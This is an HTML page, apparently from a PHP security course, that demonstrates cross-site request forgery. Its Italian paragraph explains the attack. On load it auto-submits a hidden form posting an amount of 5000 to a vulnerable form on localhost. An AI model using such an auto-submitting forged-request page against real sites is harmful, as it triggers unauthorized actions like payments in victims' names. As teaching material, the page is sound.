<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Attack Example</title>
</head>
<body onload="document.getElementById('attackForm').submit();">
    <h1>CSRF (Cross-Site Request Forgery) Attack Example</h1>
    <p>Questo esempio mostra come un attaccante può sfruttare una vulnerabilità CSRF per inviare richieste dannose a nome della vittima senza il suo consenso.</p>
    <form id="attackForm" method="POST" action="http://localhost:8080/php/13_csrf/01_form_vulnerabile.php">
        <input type="hidden" name="importo" value="5000">
    </form>
</body>
</html>